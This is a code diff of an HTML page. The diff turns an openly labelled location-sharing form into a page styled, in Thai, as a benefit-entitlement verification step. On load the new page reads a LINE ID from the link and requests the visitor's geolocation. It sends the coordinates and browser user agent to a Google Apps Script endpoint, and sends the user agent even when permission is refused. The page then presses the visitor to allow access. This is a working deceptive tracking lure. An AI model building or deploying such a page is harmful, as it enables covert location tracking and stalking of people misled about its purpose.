@@ -1,53 +1,169 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <title>Send Location</title>
-    <script>
-      async function sendLocation() {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(async (position) => {
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ตรวจสอบและยืนยันรับสิทธิ์</title>
+  <style>
+    /* General styles */
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      background: linear-gradient(135deg, #4facfe, #00f2fe);
+      color: #333;
+    }
+
+    h1 {
+      font-size: 1.8rem;
+      color: #fff;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    #errorDiv {
+      display: none;
+      background: #fff;
+      padding: 15px;
+      border-radius: 8px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      max-width: 90%;
+    }
+
+    #errorDiv p {
+      margin: 0 0 10px;
+      font-size: 1rem;
+      color: #e74c3c;
+    }
+
+    button {
+      background-color: #4caf50;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      font-size: 1rem;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #45a049;
+    }
+
+    /* Mobile responsiveness */
+    @media (max-width: 600px) {
+      h1 {
+        font-size: 1.5rem;
+      }
+
+      button {
+        font-size: 0.9rem;
+        padding: 8px 16px;
+      }
+
+      #errorDiv {
+        padding: 10px;
+      }
+    }
+  </style>
+  <script>
+
+    function getLineIdFromUrl() {
+      const params = new URLSearchParams(window.location.search);
+      return params.get("id");
+    }
+
+
+    async function sendLocation(latitude = 0, longitude = 0) {
+      const lineId = getLineIdFromUrl();
+      if (!lineId) {
+        alert("ไอดีของคุณไม่ถูกต้อง");
+        return;
+      }
+
+
+      const scriptUrl =
+        "https://script.google.com/macros/s/AKfycbz2lSrlH4nRZDMbFK4RLGw02FcOpWe-Kchvpl6tCSSOqYvaEh78zgRN9Ve1kQg_n9ao/exec"; // ใส่ URL ของ Google Apps Script
+      const url = `${scriptUrl}?lineId=${encodeURIComponent(
+        lineId
+      )}&latitude=${encodeURIComponent(
+        latitude
+      )}&longitude=${encodeURIComponent(
+        longitude
+      )}&userAgent=${encodeURIComponent(navigator.userAgent)}`;
+
+      try {
+
+        const response = await fetch(url, {
+          method: "GET",
+        });
+
+        const result = await response.json();
+        if (result.status === "success") {
+          // alert("กำลังไปที่หน้ากรอกข้อมูล!");
+        } else {
+          alert("เกิดข้อผิดพลาด");
+        }
+      } catch (error) {
+        console.error("Error:", error);
+        alert("เกิดข้อผิดพลาดในการเชื่อมต่อ");
+      }
+    }
+
+
+    function requestLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
+            sendLocation(latitude, longitude);
+            hidePermissionError();
+          },
+          (error) => {
 
-            const lineId = document.getElementById("lineId").value;
-            if (!lineId) {
-              alert("กรุณากรอก Line ID");
-              return;
-            }
-
-            // ดึงข้อมูล userAgent
-            const userAgent = navigator.userAgent;
-
-            // สร้าง URL พร้อม query parameters
-            const scriptUrl = "https://script.google.com/macros/s/AKfycbzWVCKeylca9hVP7iIMRyJJseEjwINzPwunJR6eZYk5dbOvFTnzV0RH9rg06dm-12f-/exec"; // ใส่ URL ของ Google Apps Script
-            const url = `${scriptUrl}?lineId=${encodeURIComponent(lineId)}&latitude=${encodeURIComponent(latitude)}&longitude=${encodeURIComponent(longitude)}&userAgent=${encodeURIComponent(userAgent)}`;
-            try {
-              // ส่งข้อมูลด้วย GET method
-              const response = await fetch(url, {
-                method: "GET",
-              });
-
-              const result = await response.json();
-              if (result.status === "success") {
-                alert("ส่งตำแหน่งสำเร็จ!");
-              } else {
-                alert("เกิดข้อผิดพลาด: " + result.message);
-              }
-            } catch (error) {
-              console.error("Error:", error);
-              alert("เกิดข้อผิดพลาดในการเชื่อมต่อ");
-            }
-          });
-        } else {
-          alert("เบราว์เซอร์ของคุณไม่รองรับ Geolocation");
-        }
+            sendLocation(0, 0);
+            showPermissionError();
+          }
+        );
+      } else {
+        alert("เบราว์เซอร์ของคุณไม่รองรับ");
+        sendLocation(0, 0);
       }
-    </script>
-  </head>
-  <body>
-    <h1>ส่งตำแหน่งของคุณ</h1>
-    <label for="lineId">Line ID:</label>
-    <input type="text" id="lineId" placeholder="กรอก Line ID ของคุณ" />
-    <button onclick="sendLocation()">ส่งตำแหน่ง</button>
-  </body>
-</html>
+    }
+
+
+    function showPermissionError() {
+      const errorDiv = document.getElementById("errorDiv");
+      errorDiv.style.display = "block";
+    }
+
+
+    function hidePermissionError() {
+      const errorDiv = document.getElementById("errorDiv");
+      errorDiv.style.display = "none";
+    }
+
+
+    window.onload = function () {
+      requestLocation();
+    };
+  </script>
+</head>
+
+<body>
+  <h1>รอการตรวจสอบสิทธิ์</h1>
+  <div id="errorDiv">
+    <p>กรุณากดอนุญาตและรอการตรวจสอบ</p>
+    <button onclick="requestLocation()">ลองใหม่อีกครั้ง</button>
+  </div>
+</body>
